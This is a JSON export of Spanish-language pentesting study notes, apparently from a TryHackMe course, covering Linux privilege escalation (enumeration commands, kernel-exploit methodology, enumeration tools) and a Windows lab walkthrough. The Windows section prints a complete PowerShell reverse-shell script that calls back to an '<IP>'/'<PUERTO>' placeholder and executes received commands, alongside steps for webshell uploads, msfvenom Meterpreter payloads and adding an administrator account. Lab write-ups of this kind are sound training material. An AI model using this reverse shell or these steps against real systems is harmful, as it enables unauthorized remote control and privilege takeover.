[
  {
    "title": "4. Privilege Escalation - Kernel Exploits",
    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/2-linux-privilege-escalation/4-privilege-escalation-kernel-exploits/",
    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/2. Linux Privilege Escalation/4. Privilege Escalation - Kernel Exploits.md",
    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 2. Linux Privilege Escalation",
    "content": "La escalada de privilegios lleva, idealmente, a privilegios root. Esto puede conseguirse explotando una vulnerabilidad existente o accediendo a otra cuenta que tenga más privilegios.\n\nA no ser que una sola vulnerabilidad nos lleve a una shell de root, el proceso de escalada de privilegios se basará en configuraciones erróneas y permisos laxos.\n\nEl kernel maneja la comunicación entre componentes como la memoria y aplicaciones en los sistemas Linux. Esta funcionalidad crítica requiere que el kernel tenga permisos específicos, por lo que una explotación exitosa potencialmente llevará a privilegios root.\n\nLa metodología de explotación de kernel es sencilla:\n\n1. Identifica la versión del kernel.\n2. Busca y encuentra un código de exploit para la versión del kernel del objetivo.\n3. Ejecuta el exploit.\n\n>[!CAUTION] Un exploit de kernel fallido puede llevar a un crasheo del sistema. Asegúrate de poder permitirte este riesgo antes de explotar el kernel.\n\n----------------------------\n<h2>Fuentes de Investigación</h2>\n1. Basándote en lo que has encontrado, puedes usar Google para buscar exploits existentes.\n2. Fuentes como [esta](https://www.cvedetails.com/) también pueden ser útiles.\n3. Otra alternativa sería usar un script como LES (Linux Exploit Suggester) pero recuerda que pueden generar falsos positivos o falsos negativos.\n\n------------------------------------\n<h2>Pistas/Notas</h2>\n1. Se muy específico al buscar sobre la versión del kernel en Google, Exploit-DB o searchsploit.\n2. Asegúrate de entender cómo funciona el exploit ANTES de ejecutarlo. En un entorno CTF da igual pero puede convertirse en un problema serio en un entorno real.\n3. Algunos exploits requerirán interacción futura una vez ejecutados. Lee todos los comentarios e instrucciones.\n4. Puedes transferir el código de tu máquina al objetivo usando el módulo `SimpleHTTPServer` de python y `wget`: `python3 -m http.server <puerto>` y luego `wget http://ip:puerto/ruta`\n\n----------------------------------------\n1. Entramos a la máquina con las credenciales ofrecidas.\n   ![[Pasted image 20251126212554.png]]\n2. Vemos si tiene python.\n   ![[Pasted image 20251126212622.png]]\n3. Spawneamos la shell. \n   ![[Pasted image 20251126212719.png]]\n4. Recolectamos información sobre el kernel.\n   ![[Pasted image 20251126213505.png]]\n5. Buscamos exploits para dicha versión.\n   ![[Pasted image 20251126213558.png]]\n6. Copiamos el exploit en nuestro sistema y servimos el archivo.\n   ![[Pasted image 20251126213805.png]]\n7. Lo descargamos en la máquina objetivo.\n   ![[Pasted image 20251126213923.png]]\n   No nos deja escribir en el directorio actual y no tenemos directorio home, así que nos vamos a `/tmp` y lo descargamos ahí.\n   ![[Pasted image 20251126214047.png]]\n8. Lo ejecutamos.\n   ![[Pasted image 20251126214128.png]]\n9. No ha funcionado así que vamos a buscar otro exploit.\n   ![[Pasted image 20251126214529.png]]\n10. Encontramos otro.\n    ![[Pasted image 20251126214548.png]]\n11. Repetimos el proceso de antes hasta llegar al punto de la ejecución y lo compilamos.\n    ![[Pasted image 20251126214902.png]]\n12. Obtenemos la consola root.\n    ![[Pasted image 20251126214932.png]]\n13. Vamos a buscar la flag.\n    ![[Pasted image 20251126215023.png]]\n14. Leemos la flag.\n    ![[Pasted image 20251126215100.png]]",
    "modified": "2025-11-27T00:49:31"
  },
  {
    "title": "3. Automated Enumeration Tools",
    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/2-linux-privilege-escalation/3-automated-enumeration-tools/",
    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/2. Linux Privilege Escalation/3. Automated Enumeration Tools.md",
    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 2. Linux Privilege Escalation",
    "content": "Hay múltiples herramientas que nos pueden ahorrar tiempo durante el proceso de enumeración. Estas herramientas sólo deberían usarse sabiendo que podrían pasar por alto algunos vectores de escalada. Aquí te dejamos una lista de herramientas de enumeración automática bastante útiles.\n\nLa herramienta a usar dependerá del sistema objetivo ya que no podrás ejecutar una herramienta escrita en python, por ejemplo, en un entorno que no tenga python instalado.\n\n- **LinPeas:** https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS\n- **LinEnum:** https://github.com/rebootuser/LinEnum\n- **LES (Linux Exploit Suggester):** https://github.com/mzet-/linux-exploit-suggester\n- **Linux Smart Enumeration:** https://github.com/diego-treitos/linux-smart-enumeration\n- **Linux Priv Checker:** https://github.com/linted/linuxprivchecker",
    "modified": "2025-11-27T00:49:31"
  },
  {
    "title": "2. Enumeration",
    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/2-linux-privilege-escalation/2-enumeration/",
    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/2. Linux Privilege Escalation/2. Enumeration.md",
    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 2. Linux Privilege Escalation",
    "content": "La enumeración es el primer paso qeu debes tomar una vez ganas acceso a cualquier sistema. En entornos reales, el test no acaba cuando ganas acceso al sistema.\n\n-----------------------------------\n<h2>hostname</h2>\nEl comando `hostname` devolverá el nombre de la máquina. Aunque este valor puede ser fácilmente cambiado o ser una string sin sentido, a veces puede ofrecer cierta información a cerca de la función en la red (por ejemplo SQL-PROD-01 para un servidor de producción SQL).\n\n------------------------------------\n<h2>uname -a</h2>\nMostrará información del sistema dándonos detalles sobre el kernel usado. Es útil cuando queremos buscar versiones vulnerables del kernel que nos lleven a una escalada de privilegios.\n\n-----------------------------------------\n<h2>/proc/version</h2>\nEl filesystem proc (procfs) nos ofrece información sobre los procesos del sistema objetivo. Mirar en `/proc/version` puede darte información sobre el kernel e información adicional como si un compilador está instalado.\n\n---------------------------------------\n<h2>/etc/issue</h2>\nTambién se puede indentificar sistemas mirando el archivo `/etc/issue`. Este normalmente contiene algo de información sobre el sistema operativo pero puede ser personalizado/cambiado.\n\n------------------------------------\n<h2>Comando ps</h2>\nEl comando `ps` es un método efectivo para ver procesos corriendo en un sistema Linux. El comando `ps` mostrará los procesos para la shell actual.\n\nEl output de `ps` (Process Status) muestra:\n\n- **PID:** El ID del proceso (único).\n- **TTY:** Tipo de terminal usada por el usuario.\n- **Time:** Cantidad de tiempo de CPU usado por el proceso (no es el tiempo que lleva corriendo).\n- **CMD:** Comando o archivo ejecutable corriendo.\n\nEl comando `ps` ofrece unas cuantas opciones dde ayuda.\n\n- `ps -A`: Muestra todos los procesos.\n- `ps axjf`: Muestra el arbol de procesos.\n- `ps aux`: La opción `aux` mostrará los procesos de todos los usuarios (a), el usuario que lanzó el proceso (u) y procesos que no están atados a la terminal (x).\n\n-------------------------------------------------\n<h2>env</h2>\nEl comando `env` mostrará variables de entorno (environment).\n\nLa variable PATH podría tener un compilador o lenguaje de scripting (python) que podría ser usado para ejecutar código en el sistema objetivo o para escalar privilegios.\n\n---------------------------------------------\n<h2>sudo -l</h2>\nEl sistema objetivo puede que haya sido configurado para permitir a los usuarios ejecutar algunos (o todos los) comandos como \"root\". El comando `sudo -l` lista los comandos que puedes ejecutar usando `sudo`.\n\n--------------------------------\n<h2>ls</h2>\nUno de los comandos más comunes usados en Linux es probablemente `ls`.\n\nAl mirar potenciales vectores de escalada de privilegios, recuerda usar el comando `ls` con el parámetro `-la`. Este ejemplo de abajo muestra gráficamente por qué hacerlo.\n\n![[Pasted image 20251126142829.png]]\n\n--------------------------------------\n<h2>id</h2>\nEl comando `id` ofrecerá una vista general de de los niveles del privilegio del usuario y grupos a los que pertenece.\n\nEl comando `id` puede ser usado para obtener los resultados de otro usuario.\n\n![[Pasted image 20251126143123.png]]\n\n-----------------------------------------------\n<h2>/etc/passwd</h2>\nPuede ser una manera sencilla de descubrir más usuarios en el sistema.\n\n![[Pasted image 20251126143157.png]]\n\nSe puede convertir fácilmente en una lista de usuarios para atacar por fuerza bruta:\n\n`cat /etc/passwd | cut -d \":\" -f 1 > users.txt`\n\n-----------------------------------\n<h2>history</h2>\nMirar comandos anteriores con el comando `history` puede darnos alguna idea sobre el sistema objetivo e incluso (aunque rara vez) tener información almacenada como usuarios o contraseñas.\n\n-----------------------------------------\n<h2>ifconfig</h2>\nEl sistema objetivo puede ser un punto de pivotaje hacia otra red. El comando `ipconfig` nos dará información sobre las interfaces de red en el sistema. El ejemplo de abajo muestra que el sistema objetivo tiene 3 interfaces (eth0, tun0 y tun1). Nuestra máquina atacante sólo puede alcanzar eth0 pero no las otras dos directamente (hasta ahora que hemos tomado control del sistema objetivo).\n\n![[Pasted image 20251126184752.png]]\n\nEsto puede confirmarse mediante el comando `iproute` que nos permite ver las rutas de red existentes.\n\n![[Pasted image 20251126184827.png]]\n\n-----------------------------------\n<h2>netstat</h2>\nSiguiendo un check inicial para interfaces y rutas de red existentes, merece la pena mirar en las comunicaciones existentes. El comando `netstat` puede usarse con diferentes opciones para recoger información en conexiones existentes.\n\n- `netstat -a`: Muestra todos los puertos en escucha y conexiones establecidas.\n- `netstat -at` o `netstat -au`: Pueden usarse para listar protocolos TCP o UDP.\n- `netstat -l`: Lista puertos en modo de escucha. Puede mezclarse con la opción `-t` para listar sólo aquellos que usen el protocolo TCP.\n  ![[Pasted image 20251126185408.png]]\n- `netstat -s`: Lista estadísticas de uso por protocolo. También se puede combinar con las opciones `-t` o `-u` para limitar el output a un protocolo en especcífico.\n- `netstat -tp`: Lista las conexiones con el nombre de servicio e información PID. Se puede combinar con `-l` para listar puertos que escuchan. Si vemos que el PID/nombre de programa está vacío (`-`), puede ser que necesitemos permisos de administrador para verlo.\n- `netstat -i`: Muestra estadísticas de interfaz. En este caso eth0 y tun0 son más activas que tun1.\n  ![[Pasted image 20251126185938.png]]\n- `netstat -ano`: Es la opción más común. Muestra todos los sockets (a), no resuelve nombres (n), muestra timers (o).\n  ![[Pasted image 20251126190122.png]]\n\n--------------------------------------\n<h2>Comando find</h2>\nBuscar en el sistema cierta información o vectores de escalada puede ser complicada de forma manual. Es por esto que existen herramientas como `find`.\n\n- `find . -name flag1.txt`: Busca en el directorio actual un archivo llamado \"flag1.txt\".\n- `find /home -name flag1.txt`: Busca en el directorio `/home` el archivo \"flag1.txt\".\n- `find / -type d -name config`: Busca desde la raíz (`/`) un directorio llamado config.\n- `find / -type f -perm 0777`: Busca archivos con los permisos 777.\n- `find / -perm a=x`: Busca archivos ejecutables.\n- `find /home -user frank`: Busca todos los archivos para el usuario \"frank\" desde `/home`.\n- `find / -mtime 10`: Busca los archivos que fueron modificados en los últimos 10 días.\n- `find / -atime 10`: Busca los archivos que fueron accedidos en los últimos 10 días.\n- `find / -cmin -60`: Busca archivos cambiados en la última hora.\n- `find / -amin -60`: Busca archivos accedidos en la última hora.\n- `find / -size 50M`: Busca archivos con un tamaño de 50 MB.  Se puede combinar con `-` o `+` para indicar que sean menores o mayores que dicho tamño.\n\nEl comando `find` puede devolver cantidades ingnetes de errores como \"archivo no encontrado\" o \"permiso denegado\". Por esto es importante redirigir la salida de errores a la papelera: `2>/dev/null`.\n\n- `find / -writable -type d 2>/dev/null`: Busca directorios escribibles desde la raíz.\n- `find / -perm -222 -type d 2>/dev/null`:  Busca directorios escribibles desde la raíz.\n- `find / -perm -o w -type d 2>/dev/null`: Busca directorios escribibles desde la raíz.\n\n![[Pasted image 20251126193900.png]]\n\nSe usa o para otros, u para el dueño y g para grupos.\n\nPara encontrar herramientas o lenguajes soportados:\n\n- `find / -name perl*`\n- `find / -name python*`\n- `find / -name gcc*`\n\nPara encontrar archivos con permisos específicos, como aquellos con bit SUID: `find / -perm -u=s -type f 2>/dev/null`",
    "modified": "2025-11-27T00:49:31"
  },
  {
    "title": "1. What is Privilege Escalation",
    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/2-linux-privilege-escalation/1-what-is-privilege-escalation/",
    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/2. Linux Privilege Escalation/1. What is Privilege Escalation.md",
    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 2. Linux Privilege Escalation",
    "content": "Escalar privilegios significa pasar de un usuario con permisos reducidos a una con más permisos. Más técnicamente es la explotación de una vulnerabilidad, fallo de diseño o configuración erronea en un sistema o aplicación para ganar acceso no autorizado a recursos que normalmente están restringidos a los usuarios.\n\n------------------------------------\n<h2>¿Por qué es importante?</h2>\nEs raro al realizar un pentest en el mundo real que al conseguir un acceso inicial te de permisos administrativos.. Por eso es tan esencial. La escalada de privilegios te puede dar poder para:\n\n- Cambiar contraseñas.\n- Sobrepasar controles de acceso a información sensible.\n- Editar configuraciones de software.\n- Habilitar persistencia.\n- Cambiar los privilegios de usuarios existentes (o nuevos).\n- Ejecutar cualquier comando administrativo.",
    "modified": "2025-11-27T00:49:31"
  },
  {
    "title": "15. Windows Practice Box",
    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/1-what-the-shell/15-windows-practice-box/",
    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/1. What the Shell/15. Windows Practice Box.md",
    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 1. What the Shell",
    "content": "1. Prueba a activar la `php-reverse-shell`. ¿Funciona?\n\t1. Subimos la shell.\n\t   ![[Pasted image 20251125195020.png]]\n\t2. Nos ponemos en escucha.\n\t   ![[Pasted image 20251125195258.png]]\n\t3. Activamos la shell y esperamos la conexión.\n\t   ![[Pasted image 20251125195423.png]]\n\t   **No se puede.**\n2. Sube una webshell y obtén una reverse shell usando Powershell.\n\t1. Subimos la shell.\n\t   ![[Pasted image 20251125195633.png]]\n\t2. Nos ponemos en escucha.\n\t   ![[Pasted image 20251125195258.png]]\n\t3. Cargamos la shell y le metemos el comando que vimos en la tarea 11.\n\t   ![[Pasted image 20251125195844.png]]\n\t4. Esperamos la conexión.\n\t   ![[Pasted image 20251125200010.png]]\n3. El servidor web está corriendo con permisos SYSTEM. Crea un nuevo usuario y añádelo al grupo \"administrators\", luego inicia sesión por RDP o WinRM.\n\t1. Añadimos el usuario nuevo y lo metemos al grupo de administradores.\n\t   ![[Pasted image 20251125200148.png]]\n\t2. Inicio sesión con RDP.\n\t   ![[Pasted image 20251125200457.png]]\n4. Experimenta usando socat y netcat para obtener reverse y bind shells en el objetivo Windows.\n\t1. Netcat reverse shell.\n\t   ![[Pasted image 20251125211653.png]]\n\t2. Vamos a probar socat.\n\t   ![[Pasted image 20251125211713.png]]\n\t   Tampoco va, pero podíamos subir un socat en binario precompilado.\n\t3. Vamos a subirlo.\n\t   ![[Pasted image 20251125212356.png]]\n\t4. Ya lo tenemos en la máquina.\n\t   ![[Pasted image 20251125212702.png]]\n\t5. No nos deja.\n\t   ![[Pasted image 20251125213058.png]]\n\t6. Puede que tengamos que iniciar sesión como administrador.\n\t   No era eso.\n\t7. Vamos a subir el siguiente archivo y lo llamaremos `reverse.ps1`:\n\n```powershell\n$client = New-Object System.Net.Sockets.TCPClient('<IP>', <PUERTO>);\n$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};\nwhile(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;\n$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);\n$sendback = (iex $data 2>&1 | Out-String );\n$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\n$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n$stream.Write($sendbyte,0,$sendbyte.Length);\n$stream.Flush();\n};\n$client.Close();\n```\n\n![[Pasted image 20251125214017.png]]\n6. Crea una shell Meterpreter Windows 64 bits usando msfvenom y súbelo al objetivo. Activa la shell y captúrala con el multi/handler.\n\t1. Creamos el payload en msfvenom.\n\t   ![[Pasted image 20251126104631.png]]\n\t2. Lo subimos a la plataforma.\n\t   ![[Pasted image 20251126104646.png]]\n\t3. Nos ponemos en escucha con Metasploit.\n\t   ![[Pasted image 20251126104806.png]]\n\t4. Creamos un archivo que ejecute el archivo que hemos creado.\n\t   ![[Pasted image 20251126105011.png]]\n\t5. Lo subimos y lo ejecutamos.\n\t   ![[Pasted image 20251126105103.png]]\n\t6. No he conseguido estabilizarla de ninguna manera.\n\t   ![[Pasted image 20251126105358.png]]\n\t7. A ver si entrando como admin y ejecutando el código. Para ello voy a crear otro `.exe` con un puerto diferente.\n\t\t1. Entramos con administrador.\n\t\t   ![[Pasted image 20251126113116.png]]\n\t\t2. Creamos y cargamos el nuevo archivo.\n\t\t   ![[Pasted image 20251126113344.png]]\n\t\t   ![[Pasted image 20251126113145.png]]\n\t\t3. Nos ponemos en escucha con multi/handler (antes debemos configurar el payload, como se ve en la última foto).\n\t\t   ![[Pasted image 20251126113428.png]]\n\t\t4. Ejecutamos el código.\n\t\t   ![[Pasted image 20251126113459.png]]\n\t\t5. Recibimos la shell.\n\t\t   ![[Pasted image 20251126114227.png]]\n\t\t6. Si escribimos help nos salen todos los comandos que podemos utilizar.\n\t\t   ![[Pasted image 20251126114408.png]]\n7. Crea una shell Meterpreter staged y uno stageless. Intenta capturarlas con netcat. ¿Funciona?\n\t1. Creamos la stageless.\n\t   ![[Pasted image 20251126115925.png]]\n\t2. Creamos la staged.\n\t   ![[Pasted image 20251126115939.png]]\n\t3. Subimos las dos.\n\t   ![[Pasted image 20251126115658.png]]\n\t   ![[Pasted image 20251126115722.png]]\n\t4. Nos ponemos en escucha con `nc`.\n\t   ![[Pasted image 20251126120213.png]]\n\t\t1. La stageless sí funciona.\n\t\t   ![[Pasted image 20251126120357.png]]\n\t\t2. La del staged no funciona, habría que capturarla con multi/handler.\n\t\t   ![[Pasted image 20251126121127.png]]",
    "modified": "2025-11-27T00:49:31"
  }
]